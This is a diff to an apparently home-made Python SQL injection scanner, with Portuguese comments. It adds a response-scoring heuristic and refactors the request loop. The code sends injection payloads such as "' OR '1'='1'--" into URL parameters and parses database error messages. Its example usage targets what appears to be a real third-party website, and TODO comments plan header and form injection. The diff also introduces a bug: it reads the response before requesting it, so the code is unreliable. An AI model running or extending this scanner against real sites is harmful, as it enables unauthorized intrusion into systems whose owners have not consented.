@@ -5,12 +5,24 @@ import functions
 import essentials
 
 # payload -> payload enviado
-# suspicious_response -> resposta bruta
+# r -> resposta bruta
+async def sqli_score_system(payload, r):
+    score = 5  # Pontuação inicial, pre-validado (max: 20pts)
+    dbase_types = ['mysql', 'postgresql', 'sqlserver', 'oracle', 'mongodb', 'sqlite', 'redis', 'db2', 'mariadb', 'cockroachdb']
+    suspicious = {
+        'response_length': 3 if len(r.text) > 1500 else 2 if len(r.text) < 200 else 0,
+        'response_time': 6 if r.elapsed.total_seconds() > 10 else 4 if r.elapsed.total_seconds() > 5 else 0,
+        'response_code': 3 if r.status_code == 500 else 2 if r.status_code == 403 else 0,
+        'response_header': 3 if "X-Powered-By" in r.headers and any(b in r.headers.get('X-Powered-By', '').lower() for b in dbase_types) else 0,
+    }
+    score += sum(v for v in suspicious.values())
+    return score
 
 async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, interval=5, continue_=False, score_sqli=False):
-
-    # tornar o modo advanced uma forma de reconhecimento do sql
-
+    # CONSTANTES
+    name_save_file = 'sqli.json'
+    scheme = 'https' if SSL else 'http' # define se e http ou https
+    
     default_payload = [
         "1 OR 1=1",
         "' OR '1'='1'--",
@@ -95,7 +107,6 @@ async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, i
         ],
     }
 
-
     if len(file.strip()) > 0:
         payloads = await essentials.fileReader(file)
         if not payloads:
@@ -105,11 +116,9 @@ async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, i
         payloads = default_payload
     
     async def sqli_async(payloads):
-        
-        name_save_file = 'sqli.json'
-        bd = [] # armazena o tipo de bd usado
+        # VARIAVEIS
         background = [] # tecnologias reconhecidas durante o teste
-        scheme = 'https' if SSL else 'http' # define se e http ou https
+        score = 0    
 
         for payload in payloads:
             score = 0 # se o sistema de score estiver ativo
@@ -117,30 +126,33 @@ async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, i
             test_url = f'{scheme}://{url}'.replace('*', payload)
 
             await asyncio.sleep(interval) # intervalo entre requisicoes
-
-            print(f'[-][{functions.time_now()}] Tentando: {test_url}')
+            
+            print(f'[-][{functions.time_now()}] Tentando: {r.url}')
             status, r = await functions.request(test_url, timeout=timeout, SSL=SSL, proxies=proxies) # requisicao
-            print(f'{" "*3}[*] {r.headers}')
+            # print(f'{" "*3}[*] {r.headers}')
             if status:
                 for k, v in error_messages.items(): # itera sobre o dicionario
                     # if any(error_msg.lower() in r.text.lower() for error_msg in v): 
                     if any(re.search(error_msg.lower(), r.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
-                        bd.append(k)
+                        background.append(k)
                         print(f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url.replace("*", "")} -> {payload}')
                         print(f'{" "*3}[*] Tipo: {k} Msg: {error_msg} url: {test_url}')
 
+                        if score_sqli:
+                            score = await sqli_score_system(payload, r)
                         
                         if not continue_:
                             return True, f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
             else:
-                print(f'[-][{functions.time_now()}] {r}')
+                print(f'[-][{functions.time_now()}] Falha ao requisitar: {r}')
             
             json_obj_response = {
                 'hostname': url,
                 'payload': payload,
                 'url': test_url,
-                'background': bd if len(bd) > 0 else None,
-                'details': None,
+                'response_time': r.elapsed.total_seconds() if status else None,
+                'background': background if len(background) > 0 else None,
+                'details': score if score_sqli else None,
                 'status_code': r.status_code if status else 404,
                 'error': False if status else True,
                 'error_details': None if status else r,
@@ -154,11 +166,15 @@ async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, i
         
     return False, f'[-][{functions.time_now()}] Nenhuma vulnerabilidade encontrada'
 
-# detect form
+# deteccao de campos de formulario para insercao de paramentros
+# criar uma forma de detctar inputs e preenchelos
 
 
 # detect query_strings_detect
+# detectar query strings onde pode ser passado parametros de sqli
 
+
+# criar um meio de fazer sqli por headers, assim como subdominios e subdiretorios
 
 # Exemplo de uso:
 async def main():
@@ -166,6 +182,7 @@ async def main():
         'www.socasadas.com/?s=*',
         '/home/maserati/Downloads/Python/wx78/wordlists/sqli/injection.txt',
         continue_=True,
+        score_sqli=True,
     )
 
 asyncio.run(main())
